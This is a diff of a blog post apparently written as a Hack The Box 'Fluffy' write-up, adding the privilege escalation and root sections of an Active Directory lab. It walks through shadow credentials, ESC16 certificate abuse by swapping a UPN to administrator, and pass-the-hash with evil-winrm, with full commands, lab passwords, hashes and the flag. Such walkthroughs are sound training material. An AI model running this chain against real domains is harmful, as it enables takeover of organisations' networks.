@@ -7,7 +7,7 @@
 ## Intro
 Today, the HTB challenge “Fluffy”, part of Season 8, has officially been retired. That’s why, having successfully completed it, I decided to share the steps I followed to reach the final solution, capturing both required flags.
 
-I want to say right away that this has been one of the most interesting machines I worked on this year. At the time, I was preparing for the PJPT exam by TCM Security (which I successfully passed at the end of last month), and I needed some practice with Active Directory. This machine also had something extra to offer!
+I want to say right away that this has been one of the most interesting machines I worked on this year. At the time, I was preparing for the PJPT exam by TCM Security (*which I successfully passed at the end of last month*), and I needed some practice with Active Directory. This machine also had something extra to offer!
 For an entry-level player like me, it wasn’t exactly easy: at first, I even thought about giving up... but then I told myself: never give up! **And here I am.**
 
 ---
@@ -477,3 +477,272 @@ User flag obtained!
 
 ---
 
+## PRIVESC - ESC16
+
+The privilege escalation step is often the most challenging. If it’s already tough when working locally, imagine how it is in a Domain environment! But this shouldn’t discourage us — on the contrary, it should give us a lot of motivation.
+
+In our specific case, we know we have “power” over a service account called ca_svc, and we also know that one of the ways to perform a privesc in an AD environment is through the exploitation of vulnerable certificates.
+
+The step I decided to take, therefore, was to target ca_svc and repeat the same attack we performed against winrm_svc. But in this case, as we’ll see, it’s not to obtain a shell as ca_svc — rather, it’s to leverage its capabilities.
+
+So, we will proceed as follows:
+
+- Add our p.agila account to the service accounts (with BloodyAD);
+- Perform Shadow Credentials with Certipy (as done previously);
+- Use the obtained ca_svc credentials to find and exploit vulnerable certificates;
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ bloodyAD --host 10.10.11.69 -d FLUFFY.HTB -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' 'p.agila'
+[+] p.agila added to Service Accounts
+
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'CA_SVC'  -dc-ip '10.10.11.69'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '84c527d4-7934-9a31-0e3d-4629d99d3d80'
+[*] Adding Key Credential with device ID '84c527d4-7934-9a31-0e3d-4629d99d3d80' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '84c527d4-7934-9a31-0e3d-4629d99d3d80' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+```
+
+Now that we have the hash, we can use it as a credential to search — as mentioned — for vulnerable certificates, again using Certipy, this time with its “find” module:
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout -vulnerable -dc-ip 10.10.11.69
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+
+```
+
+Got it! We found the ESC16 vulnerability (a flaw in certain AD certificate configurations that allows attackers to escalate privileges by abusing certificate-based authentication).
+
+When you encounter certificate vulnerabilities, I highly recommend following step-by-step the excellent instructions provided in the official Certipy Github page (...this led me directly to the root flag):
+
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
+
+Below, I outline the steps I followed. If you want a detailed explanation, feel free to check the link above.
+
+1. Read the UPN of the victim (in our case, ca_svc):
+
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ certipy account \
+    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+    -dc-ip '10.10.11.69' -user 'ca_svc' \       
+    read
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-09-05T23:34:57+00:00
+
+```
+
+
+2. Update the victim’s UPN (ca_svc) to that of the Admin:
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ certipy account \
+    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+    -dc-ip '10.10.11.69' -upn 'administrator' \
+    -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+
+```
+
+3. Request a certificate using the “User” template:
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ certipy req \
+    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' \
+    -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' \
+    -template 'User'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 20
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+```
+
+4. Restore the UPN of the victim account (ca_svc):
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ certipy account \
+    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+    -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' \
+    -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+
+```
+
+
+5. Authenticate as the administrator (due to clock skew preventing the command from working correctly, we add faketime):
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ faketime -f +7h certipy auth \
+    -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
+    -username 'administrator' -domain 'fluffy.htb'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+
+```
+
+**…BOOM!** We have obtained the administrator’s hash!
+
+---
+
+## Root
+
+There’s little to comment on. The final step is that breath of fresh air that fills you with oxygen, and after so much effort, makes you say: I did it! It’s over!
+
+So, let’s conclude this amazing machine:
+
+```bash
+┌──(urielsg㉿Kali)-[~/Scrivania]
+└─$ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         9/2/2025   4:01 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+2257edf9331bb13725a5ac5083f05bb4
+
+```
+
+---
+
+## Conclusion
+
+Personally, I faced a real challenge. As I mentioned in the introduction, during Season 8, partly due to lack of time and partly because of other commitments, I hadn’t been able to finish it: I reached the first flag and then got stuck. For me, this machine was fundamental — I was preparing for the PJPT, which focuses on internal penetration testing, and I needed it as practice. After hours and hours of attempts, however… I gave up.
+
+Nevertheless, before Fluffy’s retirement, and after the excitement of successfully passing the PJPT, I picked it up again and brought it to completion.
+
+It was a fantastic experience: I had the chance to review “classic” concepts and learn new things. It felt like a complete machine for Active Directory, and the certificate-related part undeniably opens up a whole new world.
+
+HTB says it’s easy, but… either I’m really bad, or HTB’s “easy” is at least equivalent to medium on any other platform.
+
+That said, I’ll sign off here!
+
+Happy Hacking!
